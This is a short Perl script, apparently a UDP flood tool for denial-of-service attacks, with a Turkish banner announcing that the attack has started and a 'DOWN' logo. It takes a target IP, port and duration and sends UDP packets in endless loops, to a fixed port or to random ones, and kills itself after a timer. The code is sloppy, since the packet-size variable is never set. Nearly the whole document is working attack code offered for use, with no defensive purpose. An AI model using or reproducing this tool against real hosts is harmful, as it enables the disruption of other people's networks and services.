#!/usr/bin/perl

use Socket;

$ARGC=@ARGV;

if ($ARGC !=3) {
printf "  \n";
printf "      \n";
printf "   HIHIHIHI I'AM COLAK HIHIHIHI    \n";
printf "      \n";
printf "            perl udp.pl ip port packet     \n";
exit(1);
}

my ($ip,$port,$size,$time);
$ip=$ARGV[0];
$port=$ARGV[1];
$time=$ARGV[2];

socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");

printf "
         
         ██████╗  ██████╗ ██╗    ██╗███╗   ██╗
         ██╔══██╗██╔═══██╗██║    ██║████╗  ██║
         ██║  ██║██║   ██║██║ █╗ ██║██╔██╗ ██║
         ██║  ██║██║   ██║██║███╗██║██║╚██╗██║
         ██████╔╝╚██████╔╝╚███╔███╔╝██║ ╚████║
         ╚═════╝  ╚═════╝  ╚══╝╚══╝ ╚═╝  ╚═══╝
                        
				    colak.offical
						
						
					SALDIRI BASLADI			 \n";

if ($ARGV[1] ==0 && $ARGV[2] ==0) {
goto randpackets;
}
if ($ARGV[1] !=0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto packets;
}
if ($ARGV[1] !=0 && $ARGV[2] ==0) {
goto packets;
}
if ($ARGV[1] ==0 && $ARGV[2] !=0) {
system("(sleep $time;killall -9 udp) &");
goto randpackets;
}

packets:
for (;;) {
$size=$rand x $rand x $rand;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}

randpackets:
for (;;) {
$size=$rand x $rand x $rand;
$port=int(rand 65500) +1;
send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}
